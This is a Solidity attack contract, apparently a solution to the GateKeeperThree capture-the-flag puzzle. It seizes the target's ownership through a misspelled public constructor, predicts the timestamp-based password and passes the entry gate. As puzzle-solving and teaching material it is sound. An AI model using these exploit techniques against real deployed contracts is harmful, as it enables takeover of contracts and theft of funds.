// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

//GateKeeperThree: 0xaF5793a7E158A930BceD32D5350Cdf1871219F1E

interface ISimpleTrick {
    function trickyTrick() external;

    function checkPassword(uint _password) external returns (bool);
}

interface IGateKeeperThree {
    function owner() external returns (address);

    function entrant() external returns (address);

    function allowEntrance() external returns (bool);

    function construct0r() external;

    function createTrick() external;

    function trick() external returns (ISimpleTrick);

    function getAllowance(uint _password) external;

    function enter() external;
}

contract GoSmashThem {
    error taskFailed(address owner, address currentEntrant, bool allowance);
    event LogSendEther(bool success);
    event Log(address currentEntrant);

    function poke(address _target) public payable {
        require(msg.value == 0.002 ether, "0.002 ether needed!");
        IGateKeeperThree gateKeeperThree = IGateKeeperThree(_target);
        (bool result, ) = address(gateKeeperThree).call{value: msg.value}("");
        // emit LogSendEther(result);
        require(result);
        gateKeeperThree.construct0r();
        gateKeeperThree.createTrick();
        ISimpleTrick simpleTrick = ISimpleTrick(gateKeeperThree.trick());
        simpleTrick.checkPassword(1);
        uint password = block.timestamp;
        gateKeeperThree.getAllowance(password);
        require(
            gateKeeperThree.allowEntrance() &&
                gateKeeperThree.owner() == address(this) &&
                address(gateKeeperThree).balance > 0.001 ether,
            "One of the conditions are failed!"
        );
        try gateKeeperThree.enter() {} catch {}
        address currentEntrant = gateKeeperThree.entrant();
        if (currentEntrant != msg.sender) {
            revert taskFailed(
                gateKeeperThree.owner(),
                currentEntrant,
                gateKeeperThree.allowEntrance()
            );
        }
    }
}
